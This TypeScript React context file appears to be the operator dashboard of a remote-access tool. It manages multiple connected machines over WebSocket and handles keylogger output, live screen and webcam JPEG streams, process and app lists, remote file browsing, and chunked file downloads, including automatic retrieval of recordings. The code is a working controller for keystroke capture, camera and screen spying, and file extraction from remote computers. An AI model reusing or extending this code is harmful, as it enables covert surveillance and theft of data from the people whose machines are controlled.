import { createContext, useCallback, useContext, useEffect, useRef, useState, type ReactNode } from 'react';
import { GatewayWsClient } from './client';
import type { AppInfo, BackendFrameEvent, Client, ConnectionStatus, FileEntry, Process } from './types';

interface GatewayContextValue {
  // Connection
  wsClient: GatewayWsClient | null;
  connectionStatus: ConnectionStatus;
  connect: (ip: string, port: string) => void;
  disconnect: () => void;

  // Clients
  clients: Map<number, Client>;
  activeClientId: number | null;
  setActiveClientId: (id: number | null) => void;
  activeClient: Client | null;

  // Commands
  sendCommand: (command: string) => void;
  sendCommandTo: (backendId: number, command: string) => void;

  // Optimistic Cache Updates
  addFileToCache: (path: string, file: FileEntry) => void;
  removeFileFromCache: (path: string, fileName: string) => void;
  renameFileInCache: (path: string, oldName: string, newName: string, newPath: string) => void;
  invalidateCache: (path: string) => void;
}

const GatewayContext = createContext<GatewayContextValue | null>(null);

export function useGateway() {
  const context = useContext(GatewayContext);
  if (!context) {
    throw new Error('useGateway must be used within a GatewayProvider');
  }
  return context;
}

interface GatewayProviderProps {
  children: ReactNode;
}

export function GatewayProvider({ children }: GatewayProviderProps) {
  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>('DISCONNECTED');
  const [clients, setClients] = useState<Map<number, Client>>(new Map());
  const [activeClientId, setActiveClientId] = useState<number | null>(null);
  const [gatewayStatus, setGatewayStatus] = useState<string>('');

  const wsClientRef = useRef<GatewayWsClient | null>(null);
  const pingIntervalRef = useRef<any>(null);
  const currentDownloadRef = useRef<{
    path: string,
    name: string,
    chunks: { seq: number, data: ArrayBuffer, isLast: boolean }[]
  } | null>(null);

  // Download completion logic
  const finishDownload = useCallback(() => {
    if (!currentDownloadRef.current) return;

    try {
      // Sort chunks by sequence number to ensure order
      const sortedChunks = [...currentDownloadRef.current.chunks].sort((a, b) => a.seq - b.seq);
      const allChunks = sortedChunks.map(c => c.data);

      const blob = new Blob(allChunks, { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = currentDownloadRef.current.name;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      console.log(`[Download] Finished: ${currentDownloadRef.current.name} (${allChunks.length} chunks)`);
    } catch (err) {
      console.error('Download assembly failed:', err);
    } finally {
      currentDownloadRef.current = null;
    }
  }, []);

  // Create default client
  const createDefaultClient = useCallback((id: number): Client => ({
    id,
    hostname: `Client #${id}`,
    os: 'Unknown',
    status: 'online',
    ip: '',
    lastSeen: Date.now(),
    keylogs: [],
    logs: [],
    processes: [],
    apps: [],
    files: [],
    filesCache: new Map(),
    currentPath: '.',
    state: {
      monitor: 'idle',
      webcam: 'idle',
      keylogger: 'idle',
      fileTransfer: 'idle',
    },
  }), []);

  // Handle backend frame (text/binary)
  const handleBackendFrame = useCallback((ev: BackendFrameEvent) => {
    const { backendId } = ev;

    setClients(prev => {
      const newClients = new Map(prev);
      let client = newClients.get(backendId);

      if (!client) {
        client = createDefaultClient(backendId);
        newClients.set(backendId, client);
      }

      // Update lastSeen
      client = { ...client, lastSeen: Date.now(), status: 'online' };

      if (ev.kind === 'jpeg' || ev.kind === 'binary') {
        // Video frame - determine channel from first byte
        const data = new Uint8Array(ev.payload);
        if (data.length > 0) {
          const channel = data[0];
          const jpegData = ev.payload.slice(1);
          const blob = new Blob([jpegData], { type: 'image/jpeg' });
          const url = URL.createObjectURL(blob);

          if (channel === 0x01) {
            // Revoke old URL
            if (client.monitorFrame) URL.revokeObjectURL(client.monitorFrame);
            client = { ...client, monitorFrame: url };
          } else if (channel === 0x02) {
            if (client.webcamFrame) URL.revokeObjectURL(client.webcamFrame);
            client = { ...client, webcamFrame: url };
          }
        }
      } else if (ev.kind === 'file') {
        // Binary File Chunk - High Performance
        // Format: [4B Sequence][1B IsLast][Raw Data]
        if (ev.payload.byteLength >= 5) {
          const view = new DataView(ev.payload);
          const seq = view.getUint32(0, false);
          const isLast = view.getUint8(4) === 1;
          const data = ev.payload.slice(5);

          if (currentDownloadRef.current) {
            currentDownloadRef.current.chunks.push({ seq, data, isLast });
            if (isLast) {
              finishDownload();
              client = { ...client, state: { ...client.state, fileTransfer: 'idle' } };
            }
          }
        }
      } else if (ev.kind === 'text') {
        client = handleTextMessage(client, ev.text);
      }

      newClients.set(backendId, client);
      return newClients;
    });
  }, [createDefaultClient]);

  // Handle text messages from backend
  const handleTextMessage = (client: Client, text: string): Client => {
    // State sync
    if (text.startsWith('STATUS:SYNC:')) {
      const syncPart = text.substring(12);
      const [feature, state] = syncPart.split('=');
      const isActive = state === 'active';

      const newState = { ...client.state };
      if (feature === 'monitor') newState.monitor = isActive ? 'active' : 'idle';
      else if (feature === 'webcam') newState.webcam = isActive ? 'active' : 'idle';
      else if (feature === 'keylogger') newState.keylogger = isActive ? 'active' : 'idle';

      return { ...client, state: newState };
    }

    // Status messages
    if (text.startsWith('STATUS:')) {
      const parts = text.split(':');
      const feature = parts[1];
      const state = parts[2];

      const newState = { ...client.state };
      if (feature === 'MONITOR_STREAM') {
        if (state === 'STARTING') newState.monitor = 'starting';
        else if (state === 'STARTED') newState.monitor = 'active';
        else if (state === 'STOPPED') newState.monitor = 'idle';
      } else if (feature === 'WEBCAM_STREAM') {
        if (state === 'STARTING') newState.webcam = 'starting';
        else if (state === 'STARTED') newState.webcam = 'active';
        else if (state === 'STOPPED') newState.webcam = 'idle';
      } else if (feature === 'KEYLOGGER') {
        if (state === 'STARTING') newState.keylogger = 'starting';
        else if (state === 'STARTED') newState.keylogger = 'active';
        else if (state === 'STOPPED') newState.keylogger = 'idle';
      } else if (feature === 'FILE_UPLOAD_READY') {
        newState.fileTransfer = 'uploading';
      } else if (feature === 'FILE_UPLOAD_COMPLETE' || feature === 'FILE_UPLOAD_CANCELLED') {
        newState.fileTransfer = 'idle';
      }

      return { ...client, state: newState };
    }

    // Keylog data
    if (text.startsWith('KEYLOG: ')) {
      const char = text.substring(8);
      const entry = { text: char, timestamp: Date.now() };
      return { ...client, keylogs: [...client.keylogs, entry] };
    }

    // Clear keylogs (client-side action)
    if (text === 'STATUS:KEYLOGS_CLEARED' || text.startsWith('DATA:CLEAR_KEYLOGS')) {
      return { ...client, keylogs: [] };
    }

    // Process list - Format: PID|Name|CPU|MemoryKB|Exec|Status
    if (text.startsWith('DATA:PROCS:')) {
      const payload = text.substring(11);
      const processes: Process[] = payload.split(';').filter(Boolean).map(item => {
        const parts = item.split('|');
        return {
          pid: parseInt(parts[0], 10) || 0,
          name: parts[1] || '',
          user: 'User',
          cmd: parts[4] || parts[1] || '',
          cpu: parseFloat(parts[2]) || 0,
          memory: parseInt(parts[3], 10) || 0, // KB
          status: 'Running' as const,
        };
      });
      return { ...client, processes };
    }

    // App list
    if (text.startsWith('DATA:APPS:')) {
      const payload = text.substring(10);
      if (!payload) return { ...client, apps: [] };

      const apps: AppInfo[] = payload.split(';').filter(Boolean).map(item => {
        const parts = item.split('|');
        return {
          id: parts[0] || '',
          name: parts[1] || '',
          icon: parts[2] || '',
          exec: parts[3] || '',
          keywords: parts[4] || '',
        };
      });
      return { ...client, apps };
    }

    // File list
    if (text.startsWith('DATA:FILES:')) {
      console.log('[FILES] Received at:', Date.now(), 'length:', text.length);
      try {
        const json = text.substring(11);
        const rawFiles = JSON.parse(json);

        const files: FileEntry[] = rawFiles.map((f: any) => {
          // Robust directory detection
          const isDir = f.dir === true || f.dir === 'true' || f.dir === 1 ||
                        f.is_directory === true || f.isDir === true;
          return {
            name: f.name,
            path: f.path,
            size: f.size,
            type: isDir ? 'folder' : 'file',
            extension: f.name.includes('.') ? f.name.split('.').pop() : undefined
          };
        });

        // Also store in cache for the current path
        const newCache = new Map(client.filesCache);
        newCache.set(client.currentPath, files);
        return { ...client, files, filesCache: newCache };
      } catch (err) {
        console.error('Failed to parse file list:', err);
      }
    }

    // Prefetched subdirectory file list (Fixed JSON format)
    if (text.startsWith('DATA:FILES_PREFETCH_JSON:')) {
      try {
        const json = text.substring(25);
        const data = JSON.parse(json);
        const prefetchPath = data.path;
        const rawFiles = data.files;

        const prefetchedFiles: FileEntry[] = rawFiles.map((f: any) => {
          const isDir = f.dir === true || f.dir === 'true' || f.dir === 1 ||
                        f.is_directory === true || f.isDir === true;
          return {
            name: f.name,
            path: f.path,
            size: f.size,
            type: isDir ? 'folder' : 'file',
            extension: f.name.includes('.') ? f.name.split('.').pop() : undefined
          };
        });

        const newCache = new Map(client.filesCache);
        newCache.set(prefetchPath, prefetchedFiles);
        return { ...client, filesCache: newCache };
      } catch (err) {
        console.error('Failed to parse prefetched JSON file list:', err);
      }
    }

    // Prefetched subdirectory file list (Legacy - kept for compatibility)
    if (text.startsWith('DATA:FILES_PREFETCH:')) {
      // Legacy format skipped/ignored to avoid parsing issues
      return client;
    }

    // File download handling
    if (text.startsWith('DATA:FILE_DOWNLOAD_START:')) {
      const payload = text.substring(25);
      const [path] = payload.split('|');
      const name = path.split(/[\\/]/).pop() || 'download';
      currentDownloadRef.current = { path, name, chunks: [] };
      return { ...client, state: { ...client.state, fileTransfer: 'downloading' } };
    }

    if (text.startsWith('DATA:FILE_CHUNK:')) {
      if (currentDownloadRef.current) {
        const payload = text.substring(16);
        const parts = payload.split('|');
        if (parts.length >= 4) {
          const isLast = parts[2] === '1';
          const b64 = parts[3];

          // Convert b64 to ArrayBuffer for unified handling
          const binaryString = atob(b64);
          const bytes = new Uint8Array(binaryString.length);
          for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
          }
          currentDownloadRef.current.chunks.push({ seq: parseInt(parts[0], 10), data: bytes.buffer, isLast });

          if (isLast) {
            finishDownload();
            return { ...client, state: { ...client.state, fileTransfer: 'idle' } };
          }
        }
      }
      return client;
    }

    if (text.startsWith('DATA:FILE_DOWNLOAD_END:')) {
      currentDownloadRef.current = null;
      return { ...client, state: { ...client.state, fileTransfer: 'idle' } };
    }

    // Recording ready - auto-trigger download
    if (text.startsWith('DATA:RECORDING_READY:')) {
      const recordingPath = text.substring(21);
      console.log('[Recording] Ready:', recordingPath);
      // Trigger file download for the recording
      if (wsClientRef.current && client) {
        wsClientRef.current.sendText(client.id, `file_download ${recordingPath}`);
      }
      return client;
    }

    // Error handling
    if (text.startsWith('ERROR:')) {
      return { ...client, logs: [...client.logs, `❌ ${text}`] };
    }

    // Client name
    if (text.startsWith('INFO:NAME=')) {
      const hostname = text.substring(10).trim();
      return { ...client, hostname };
    }

    return client;
  };

  // Handle backend active (discovery)
  const handleBackendActive = useCallback((backendId: number) => {
    setClients(prev => {
      if (prev.has(backendId)) {
        const client = prev.get(backendId)!;
        const newClients = new Map(prev);
        newClients.set(backendId, { ...client, lastSeen: Date.now(), status: 'online' });
        return newClients;
      }

      const newClients = new Map(prev);
      newClients.set(backendId, createDefaultClient(backendId));
      return newClients;
    });
  }, [createDefaultClient]);

  // Connect to gateway
  const connect = useCallback((ip: string, port: string) => {
    if (wsClientRef.current) {
      wsClientRef.current.disconnect();
    }

    const wsClient = new GatewayWsClient({
      onLog: (msg) => console.log('[WS]', msg),
      onStatus: setConnectionStatus,
      onClientId: (id) => {
        console.log('🆔 Gateway assigned Client ID:', id);
        // Start ping loop for discovery
        if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
        pingIntervalRef.current = setInterval(() => {
          if (wsClientRef.current?.isConnected()) {
            wsClientRef.current.sendText(0, 'ping');
          }
        }, 5000);
        // Initial ping
        wsClientRef.current?.sendText(0, 'ping');
      },
      onGatewayText: (text) => console.log('📢 Gateway:', text),
      onBackendActive: handleBackendActive,
      onBackendFrame: handleBackendFrame,
      onClose: () => {
        if (pingIntervalRef.current) {
          clearInterval(pingIntervalRef.current);
          pingIntervalRef.current = null;
        }
      },
    });

    wsClientRef.current = wsClient;
    wsClient.connect(`ws://${ip}:${port}`);
  }, [handleBackendActive, handleBackendFrame]);

  // Disconnect
  const disconnect = useCallback(() => {
    if (pingIntervalRef.current) {
      clearInterval(pingIntervalRef.current);
      pingIntervalRef.current = null;
    }
    wsClientRef.current?.disconnect();
    wsClientRef.current = null;
    setClients(new Map());
    setActiveClientId(null);
  }, []);

  // Send command to active client
  const sendCommand = useCallback((command: string) => {
    console.log(`[GatewayContext] sendCommand: ${command} (activeClientId: ${activeClientId})`);
    if (activeClientId && wsClientRef.current?.isConnected()) {
      wsClientRef.current.sendText(activeClientId, command);
    } else {
      console.warn(`[GatewayContext] FAILED to send command: ${command}. wsConnected: ${wsClientRef.current?.isConnected()}`);
    }
  }, [activeClientId]);

  // Send command to specific backend
  const sendCommandTo = useCallback((backendId: number, command: string) => {
    if (wsClientRef.current?.isConnected()) {
      wsClientRef.current.sendText(backendId, command);
    }
  }, []);

  // === OPTIMISTIC CACHE UPDATE FUNCTIONS ===

  // Add a new file/folder to cache (for upload, mkdir)
  const addFileToCache = useCallback((dirPath: string, file: FileEntry) => {
    if (!activeClientId) return;
    setClients(prev => {
      const newMap = new Map(prev);
      const client = newMap.get(activeClientId);
      if (client) {
        const newCache = new Map(client.filesCache);
        const existing = newCache.get(dirPath) || [];
        // Avoid duplicates
        if (!existing.find(f => f.path === file.path)) {
          newCache.set(dirPath, [...existing, file]);
        }
        // Also update current files if viewing this directory
        const updatedClient = {
          ...client,
          filesCache: newCache,
          files: client.currentPath === dirPath ? [...existing, file] : client.files,
        };
        newMap.set(activeClientId, updatedClient);
      }
      return newMap;
    });
  }, [activeClientId]);

  // Remove a file/folder from cache (for delete)
  const removeFileFromCache = useCallback((dirPath: string, fileName: string) => {
    if (!activeClientId) return;
    setClients(prev => {
      const newMap = new Map(prev);
      const client = newMap.get(activeClientId);
      if (client) {
        const newCache = new Map(client.filesCache);
        const existing = newCache.get(dirPath) || [];
        const filtered = existing.filter(f => f.name !== fileName);
        newCache.set(dirPath, filtered);
        const updatedClient = {
          ...client,
          filesCache: newCache,
          files: client.currentPath === dirPath ? filtered : client.files,
        };
        newMap.set(activeClientId, updatedClient);
      }
      return newMap;
    });
  }, [activeClientId]);

  // Rename a file/folder in cache
  const renameFileInCache = useCallback((dirPath: string, oldName: string, newName: string, newPath: string) => {
    if (!activeClientId) return;
    setClients(prev => {
      const newMap = new Map(prev);
      const client = newMap.get(activeClientId);
      if (client) {
        const newCache = new Map(client.filesCache);
        const existing = newCache.get(dirPath) || [];
        const updated = existing.map(f =>
          f.name === oldName ? { ...f, name: newName, path: newPath } : f
        );
        newCache.set(dirPath, updated);
        const updatedClient = {
          ...client,
          filesCache: newCache,
          files: client.currentPath === dirPath ? updated : client.files,
        };
        newMap.set(activeClientId, updatedClient);
      }
      return newMap;
    });
  }, [activeClientId]);

  // Invalidate cache for a specific path (force refresh)
  const invalidateCache = useCallback((path: string) => {
    if (!activeClientId) return;
    setClients(prev => {
      const newMap = new Map(prev);
      const client = newMap.get(activeClientId);
      if (client) {
        const newCache = new Map(client.filesCache);
        newCache.delete(path);
        newMap.set(activeClientId, { ...client, filesCache: newCache });
      }
      return newMap;
    });
  }, [activeClientId]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
      wsClientRef.current?.disconnect();
    };
  }, []);

  const activeClient = activeClientId ? clients.get(activeClientId) ?? null : null;

  const value: GatewayContextValue = {
    wsClient: wsClientRef.current,
    connectionStatus,
    connect,
    disconnect,
    clients,
    activeClientId,
    setActiveClientId,
    activeClient,
    sendCommand,
    sendCommandTo,
    // Optimistic cache functions
    addFileToCache,
    removeFileFromCache,
    renameFileInCache,
    invalidateCache,
  };

  return (
    <GatewayContext.Provider value={value}>
      {children}
    </GatewayContext.Provider>
  );
}
